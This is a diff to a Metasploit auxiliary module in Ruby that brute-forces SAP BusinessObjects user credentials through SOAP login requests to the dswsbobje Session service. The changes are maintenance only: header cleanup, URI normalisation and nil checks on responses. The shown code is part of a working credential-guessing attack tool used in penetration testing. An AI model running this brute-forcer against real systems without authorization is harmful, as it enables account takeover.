@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -23,7 +19,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'		   => 'SAP BusinessObjects User Bruteforcer',
-			'Version'		=> '$Revision$',
 			'Description'	=> 'This module attempts to bruteforce SAP BusinessObjects users.
 				The dswsbobje interface is only used to verify valid credentials for CmcApp.
 				Therefore, any valid credentials that have been identified can be leveraged by
@@ -48,11 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		res = send_request_cgi({
 			'uri'	 => "/dswsbobje/services/listServices",
-			'method'  => 'GET',
-				'headers' => {
-					'User-Agent' => datastore['UserAgent']
-				}
-
+			'method'  => 'GET'
 		}, 25)
 		return if not res
 
@@ -62,7 +53,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def enum_user(user='administrator', pass='pass')
-		verbose = datastore['VERBOSE']
 		vprint_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'")
 		success = false
 		soapenv='http://schemas.xmlsoap.org/soap/envelope/'
@@ -80,8 +70,8 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 			res = send_request_raw({
-				'uri'		  => "/#{datastore['URI']}/services/Session",
-				'method'	   => 'POST',
+				'uri'     => normalize_uri(datastore['URI'], "/services/Session"),
+				'method'  => 'POST',
 				'data'	  => data,
 				'headers' =>
 					{
@@ -90,8 +80,8 @@ class Metasploit3 < Msf::Auxiliary
 						'Content-Type'  => 'text/xml; charset=UTF-8',
 					}
 			}, 45)
-			return :abort if (res.code == 404)
-			success = true if(res.body.match(/SessionInfo/i))
+			return :abort if (!res or (res and res.code == 404))
+			success = true if(res and res.body.match(/SessionInfo/i))
 			success
 
 		rescue ::Rex::ConnectionError
